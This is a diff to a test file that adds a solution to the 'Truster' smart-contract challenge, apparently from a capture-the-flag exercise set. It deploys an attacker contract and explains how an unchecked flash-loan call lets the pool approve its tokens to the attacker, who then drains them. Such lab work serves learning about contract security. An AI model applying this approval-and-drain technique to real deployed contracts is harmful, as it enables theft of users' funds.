@@ -29,6 +29,16 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const AttackerContract = await ethers.getContractFactory("TrusterLenderPoolAttacker", attacker);
+        this.attacker = await AttackerContract.deploy(attacker.address);
+
+        await this.attacker.connect(attacker).attack(this.pool.address, this.token.address);
+
+        /**
+         * Noted that the flash loan contract is calling a function itself on the user's demand without checking,
+         * the exploit is to approve the use of the DVT in the pool when excuting the flash loan,
+         * return all the tokens after the execution and drain the wallet by making use of the approval
+         */
     });
 
     after(async function () {
